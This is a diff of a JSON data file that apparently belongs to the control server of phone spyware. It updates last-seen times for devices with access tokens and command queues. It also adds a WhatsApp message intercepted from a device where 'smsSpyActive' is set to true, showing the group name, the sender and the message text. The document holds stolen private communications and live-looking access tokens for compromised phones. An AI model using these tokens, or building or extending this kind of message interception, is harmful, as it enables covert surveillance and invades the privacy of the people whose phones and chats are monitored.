@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777209029212,
+    "lastSeen": 1777209041826,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -4053,6 +4053,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Cwe cantik[(/ only 7 members: ~ zlfa",
+        "content": "Cikaaa",
+        "time": "26/04 21:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777209030279
+      },
       {
         "appName": "WhatsApp",
         "sender": "Cwe cantik[(/ only 7 members",
@@ -8825,7 +8833,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777209028840,
+    "lastSeen": 1777209040730,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
